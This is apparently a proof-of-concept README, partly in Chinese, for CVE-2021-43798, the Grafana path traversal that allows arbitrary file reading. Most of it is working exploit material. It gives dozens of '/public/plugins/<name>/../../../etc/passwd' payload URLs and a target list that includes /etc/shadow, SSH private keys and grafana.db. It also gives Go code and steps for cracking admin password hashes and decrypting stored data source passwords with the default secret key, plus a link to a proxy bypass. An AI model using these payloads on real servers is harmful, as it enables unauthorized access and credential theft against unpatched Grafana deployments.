# CVE-2021-43798 Grafana Unauthorized arbitrary file reading vulnerability

8.3.1 (2021-12-07) Security: Fixes **CVE-2021-43798** . For more information, see our blog

https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/

![image](https://user-images.githubusercontent.com/16593068/145146167-4b141150-530d-41ca-9f55-3d844c5eaa79.png)
![image](https://user-images.githubusercontent.com/16593068/145146187-fc9babb9-8b03-4538-b4c0-a0b08119d5e8.png)



### Example: get db password

`/var/lib/grafana/grafana.db`

![image](https://user-images.githubusercontent.com/16593068/145001684-85358acc-bc3a-4620-89f7-9a07eba98a4f.png)

加盐密码明文验证
https://github.com/grafana/grafana/blob/985c61d7008211e0fbee7d095bf3424adf71b4ac/pkg/util/encoding.go
![image](https://user-images.githubusercontent.com/16593068/218663648-ed860f4b-4049-4039-8af7-10dfd5ec75ef.png)


```golang
package main

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"golang.org/x/crypto/pbkdf2"
)

// EncodePassword encodes a password using PBKDF2.
func EncodePassword(password string, salt string) string {
	newPasswd := pbkdf2.Key([]byte(password), []byte(salt), 10000, 50, sha256.New)
	return hex.EncodeToString(newPasswd)
}

func main() {
	fmt.Println(EncodePassword("admin", "F3FAxVm33R"))
}


```
![image](https://user-images.githubusercontent.com/16593068/218391345-a52dd8b7-f257-4b9e-92d9-fa16305b4b5f.png)
![image](https://user-images.githubusercontent.com/16593068/218391449-e01f7e76-9027-4ef8-817a-09e083c7e044.png)

Config `/etc/grafana/grafana.ini`

```
bash-5.1$ ps -ef |grep grafana
    1 grafana   0:35 grafana-server --homepath=/usr/share/grafana --config=/etc/grafana/grafana.ini --packaging=docker cfg:default.log.mode=console cfg:default.paths.data=/var/lib/grafana cfg:default.paths.logs=/var/log/grafana cfg:default.paths.plugins=/var/lib/grafana/plugins cfg:default.paths.provisioning=/etc/grafana/provisioning
```


### Ensure encryption of data source secrets

Data sources store passwords and basic auth passwords in secureJsonData encrypted (AES-256 in CFB mode) by default. Existing data source will keep working with unencrypted passwords. If you want to migrate to encrypted storage for your existing data sources you can do that by:

- For data sources created through UI, you need to go to data source config, re-enter the password or basic auth password and save the data source.
- For data sources created by provisioning, you need to update your config file and use secureJsonData.password or secureJsonData.basicAuthPassword field. See [provisioning docs]({{< relref "../administration/provisioning" >}}) for example of current configuration.

https://github.com/grafana/grafana/blob/main/pkg/util/encryption.go

![image](https://user-images.githubusercontent.com/16593068/145146060-3e142f40-5cc3-4124-8db1-a7ee0ffc998d.png)

#### decode password

例如： 从数据库`/var/lib/grafana/grafana.db`获得数据源密文 `R3pMVVh1UHLoUkTJOl+Z/sFymLqolUOVtxCtQL/y+Q==` ,通过读取 `/etc/grafana/grafana.ini` 中的 `secret_key` (default: SW2YcwTIb9zpOOhoPsMm),进行解密

```
$ go run AESDecrypt.go
[*] grafanaIni_secretKey= SW2YcwTIb9zpOOhoPsMm
[*] DataSourcePassword= R3pMVVh1UHLoUkTJOl+Z/sFymLqolUOVtxCtQL/y+Q==
[*] plainText= jas502n

```

#### encode password
例如： 将明文密码`jas502n`通过key，加密成密文

```
[*] grafanaIni_secretKey= SW2YcwTIb9zpOOhoPsMm
[*] PlainText= jas502n
[*] EncodePassword= QWhMOFdNZkqW6bx9YM0dPHMjzInsvycQXgMmMfFqpA==
```

### other attack

```
/conf/defaults.ini
/etc/grafana/grafana.ini
/etc/passwd
/etc/shadow
/home/grafana/.bash_history
/home/grafana/.ssh/id_rsa
/root/.bash_history
/root/.ssh/id_rsa
/usr/local/etc/grafana/grafana.ini
/var/lib/grafana/grafana.db
/proc/net/fib_trie
/proc/net/tcp
/proc/self/cmdline
```

```
Default plugins count: 40
Successful count: 48
```
[Bypass grafana nginx Proxy error 400 ](https://articles.zsxq.com/id_baeb9hmiroq5.html)

https://twitter.com/chybeta/status/1468410745264041992


```
/public/plugins/alertGroups/../../../../../../../../etc/passwd
/public/plugins/alertlist/../../../../../../../../etc/passwd
/public/plugins/alertmanager/../../../../../../../../etc/passwd
/public/plugins/annolist/../../../../../../../../etc/passwd
/public/plugins/barchart/../../../../../../../../etc/passwd
/public/plugins/bargauge/../../../../../../../../etc/passwd
/public/plugins/canvas/../../../../../../../../etc/passwd
/public/plugins/cloudwatch/../../../../../../../../etc/passwd
/public/plugins/dashboard/../../../../../../../../etc/passwd
/public/plugins/dashlist/../../../../../../../../etc/passwd
/public/plugins/debug/../../../../../../../../etc/passwd
/public/plugins/elasticsearch/../../../../../../../../etc/passwd
/public/plugins/gauge/../../../../../../../../etc/passwd
/public/plugins/geomap/../../../../../../../../etc/passwd
/public/plugins/gettingstarted/../../../../../../../../etc/passwd
/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd
/public/plugins/grafana/../../../../../../../../etc/passwd
/public/plugins/graph/../../../../../../../../etc/passwd
/public/plugins/graphite/../../../../../../../../etc/passwd
/public/plugins/heatmap/../../../../../../../../etc/passwd
/public/plugins/histogram/../../../../../../../../etc/passwd
/public/plugins/influxdb/../../../../../../../../etc/passwd
/public/plugins/jaeger/../../../../../../../../etc/passwd
/public/plugins/live/../../../../../../../../etc/passwd
/public/plugins/logs/../../../../../../../../etc/passwd
/public/plugins/loki/../../../../../../../../etc/passwd
/public/plugins/mixed/../../../../../../../../etc/passwd
/public/plugins/mssql/../../../../../../../../etc/passwd
/public/plugins/mysql/../../../../../../../../etc/passwd
/public/plugins/news/../../../../../../../../etc/passwd
/public/plugins/nodeGraph/../../../../../../../../etc/passwd
/public/plugins/opentsdb/../../../../../../../../etc/passwd
/public/plugins/piechart/../../../../../../../../etc/passwd
/public/plugins/pluginlist/../../../../../../../../etc/passwd
/public/plugins/postgres/../../../../../../../../etc/passwd
/public/plugins/prometheus/../../../../../../../../etc/passwd
/public/plugins/stat/../../../../../../../../etc/passwd
/public/plugins/state-timeline/../../../../../../../../etc/passwd
/public/plugins/status-history/../../../../../../../../etc/passwd
/public/plugins/table-old/../../../../../../../../etc/passwd
/public/plugins/table/../../../../../../../../etc/passwd
/public/plugins/tempo/../../../../../../../../etc/passwd
/public/plugins/testdata/../../../../../../../../etc/passwd
/public/plugins/text/../../../../../../../../etc/passwd
/public/plugins/timeseries/../../../../../../../../etc/passwd
/public/plugins/welcome/../../../../../../../../etc/passwd
/public/plugins/xychart/../../../../../../../../etc/passwd
/public/plugins/zipkin/../../../../../../../../etc/passwd
```

# 0x0 Default plugins installed (40) list:

http://x.x.x.x:3000/api/plugins?embedded=0

```
alertlist
annolist
grafana-azure-monitor-datasource
barchart
bargauge
cloudwatch
dashlist
elasticsearch
gauge
geomap
gettingstarted
stackdriver
graph
graphite
heatmap
histogram
influxdb
jaeger
logs
loki
mssql
mysql
news
nodeGraph
opentsdb
piechart
pluginlist
postgres
prometheus
stat
state-timeline
status-history
table
table-old
tempo
testdata
text
timeseries
welcome
zipkin
```
![image](https://user-images.githubusercontent.com/16593068/144999119-26b04c63-e8bc-49f6-9fc4-c05a8f41d585.png)

# 0x01 /usr/share/grafana/public/app/plugins/datasource ( 21)

```
/usr/share/grafana/public/app/plugins/datasource

bash-5.1$ ls -l
drwxr-xr-x    3 root     root          4096 Oct  7 10:55 alertmanager
drwxr-xr-x    7 root     root          4096 Oct  7 10:55 cloud-monitoring
drwxr-xr-x    8 root     root          4096 Oct  7 10:55 cloudwatch
drwxr-xr-x    2 root     root          4096 Oct  7 10:55 dashboard
drwxr-xr-x    9 root     root          4096 Oct  7 10:55 elasticsearch
drwxr-xr-x    3 root     root          4096 Oct  7 10:55 grafana
drwxr-xr-x   19 root     root          4096 Oct  7 10:55 grafana-azure-monitor-datasource
drwxr-xr-x    9 root     root          4096 Oct  7 10:55 graphite
drwxr-xr-x    6 root     root          4096 Oct  7 10:55 influxdb
drwxr-xr-x    4 root     root          4096 Oct  7 10:55 jaeger
drwxr-xr-x    7 root     root          4096 Oct  7 10:55 loki
drwxr-xr-x    2 root     root          4096 Oct  7 10:55 mixed
drwxr-xr-x    5 root     root          4096 Oct  7 10:55 mssql
drwxr-xr-x    5 root     root          4096 Oct  7 10:55 mysql
drwxr-xr-x    6 root     root          4096 Oct  7 10:55 opentsdb
drwxr-xr-x    5 root     root          4096 Oct  7 10:55 postgres
drwxr-xr-x    7 root     root          4096 Oct  7 10:55 prometheus
drwxr-xr-x    4 root     root          4096 Oct  7 10:55 tempo
drwxr-xr-x    7 root     root          4096 Oct  7 10:55 testdata
drwxr-xr-x    4 root     root          4096 Oct  7 10:55 zipkin
```
Fuzz Successful!
<img width="938" alt="image-20211207165332908" src="https://user-images.githubusercontent.com/16593068/144999319-d999d749-5afd-4bd6-bb39-559e96cd48bc.png">

```
/public/plugins/alertmanager/../../../../../../../../etc/passwd
/public/plugins/cloudwatch/../../../../../../../../etc/passwd
/public/plugins/dashboard/../../../../../../../../etc/passwd
/public/plugins/elasticsearch/../../../../../../../../etc/passwd
/public/plugins/grafana/../../../../../../../../etc/passwd
/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd
/public/plugins/graphite/../../../../../../../../etc/passwd
/public/plugins/influxdb/../../../../../../../../etc/passwd
/public/plugins/jaeger/../../../../../../../../etc/passwd
/public/plugins/loki/../../../../../../../../etc/passwd
/public/plugins/mixed/../../../../../../../../etc/passwd
/public/plugins/mssql/../../../../../../../../etc/passwd
/public/plugins/mysql/../../../../../../../../etc/passwd
/public/plugins/opentsdb/../../../../../../../../etc/passwd
/public/plugins/postgres/../../../../../../../../etc/passwd
/public/plugins/prometheus/../../../../../../../../etc/passwd
/public/plugins/tempo/../../../../../../../../etc/passwd
/public/plugins/testdata/../../../../../../../../etc/passwd
/public/plugins/zipkin/../../../../../../../../etc/passwd
```

# 0x02 /usr/share/grafana/public/app/plugins/ (29)

```
/usr/share/grafana/public/app/plugins/panel/

drwxr-xr-x    2 root     root        4.0K Oct  7 10:55 alertGroups
drwxr-xr-x    3 root     root        4.0K Oct  7 10:55 alertlist
drwxr-xr-x    3 root     root        4.0K Oct  7 10:55 annolist
drwxr-xr-x    4 root     root        4.0K Oct  7 10:55 barchart
drwxr-xr-x    3 root     root        4.0K Oct  7 10:55 bargauge
drwxr-xr-x    4 root     root        4.0K Oct  7 10:55 canvas
drwxr-xr-x    3 root     root        4.0K Oct  7 10:55 dashlist
drwxr-xr-x    3 root     root        4.0K Oct  7 10:55 debug
drwxr-xr-x    4 root     root        4.0K Oct  7 10:55 gauge
drwxr-xr-x    8 root     root        4.0K Oct  7 10:55 geomap
drwxr-xr-x    4 root     root        4.0K Oct  7 10:55 gettingstarted
drwxr-xr-x    5 root     root        4.0K Oct  7 10:55 graph
drwxr-xr-x    5 root     root        4.0K Oct  7 10:55 heatmap
drwxr-xr-x    3 root     root        4.0K Oct  7 10:55 histogram
drwxr-xr-x    3 root     root        4.0K Oct  7 10:55 live
drwxr-xr-x    3 root     root        4.0K Oct  7 10:55 logs
drwxr-xr-x    3 root     root        4.0K Oct  7 10:55 news
drwxr-xr-x    4 root     root        4.0K Oct  7 10:55 nodeGraph
drwxr-xr-x    3 root     root        4.0K Oct  7 10:55 piechart
drwxr-xr-x    4 root     root        4.0K Oct  7 10:55 pluginlist
drwxr-xr-x    3 root     root        4.0K Oct  7 10:55 stat
drwxr-xr-x    4 root     root        4.0K Oct  7 10:55 state-timeline
drwxr-xr-x    3 root     root        4.0K Oct  7 10:55 status-history
drwxr-xr-x    4 root     root        4.0K Oct  7 10:55 table
drwxr-xr-x    4 root     root        4.0K Oct  7 10:55 table-old
drwxr-xr-x    3 root     root        4.0K Oct  7 10:55 text
drwxr-xr-x    6 root     root        4.0K Oct  7 10:55 timeseries
drwxr-xr-x    3 root     root        4.0K Oct  7 10:55 welcome
drwxr-xr-x    3 root     root        4.0K Oct  7 10:55 xychart
```
<img width="903" alt="image-20211207170001125" src="https://user-images.githubusercontent.com/16593068/144999499-1b152ebc-c678-463f-bfe5-116a8d77656b.png">

Fuzz Success

```
/public/plugins/alertGroups/../../../../../../../../etc/passwd
/public/plugins/alertlist/../../../../../../../../etc/passwd
/public/plugins/annolist/../../../../../../../../etc/passwd
/public/plugins/barchart/../../../../../../../../etc/passwd
/public/plugins/bargauge/../../../../../../../../etc/passwd
/public/plugins/canvas/../../../../../../../../etc/passwd
/public/plugins/dashlist/../../../../../../../../etc/passwd
/public/plugins/debug/../../../../../../../../etc/passwd
/public/plugins/gauge/../../../../../../../../etc/passwd
/public/plugins/geomap/../../../../../../../../etc/passwd
/public/plugins/gettingstarted/../../../../../../../../etc/passwd
/public/plugins/graph/../../../../../../../../etc/passwd
/public/plugins/heatmap/../../../../../../../../etc/passwd
/public/plugins/histogram/../../../../../../../../etc/passwd
/public/plugins/live/../../../../../../../../etc/passwd
/public/plugins/logs/../../../../../../../../etc/passwd
/public/plugins/news/../../../../../../../../etc/passwd
/public/plugins/nodeGraph/../../../../../../../../etc/passwd
/public/plugins/piechart/../../../../../../../../etc/passwd
/public/plugins/pluginlist/../../../../../../../../etc/passwd
/public/plugins/stat/../../../../../../../../etc/passwd
/public/plugins/state-timeline/../../../../../../../../etc/passwd
/public/plugins/status-history/../../../../../../../../etc/passwd
/public/plugins/table/../../../../../../../../etc/passwd
/public/plugins/table-old/../../../../../../../../etc/passwd
/public/plugins/text/../../../../../../../../etc/passwd
/public/plugins/timeseries/../../../../../../../../etc/passwd
/public/plugins/welcome/../../../../../../../../etc/passwd
/public/plugins/xychart/../../../../../../../../etc/passwd
```

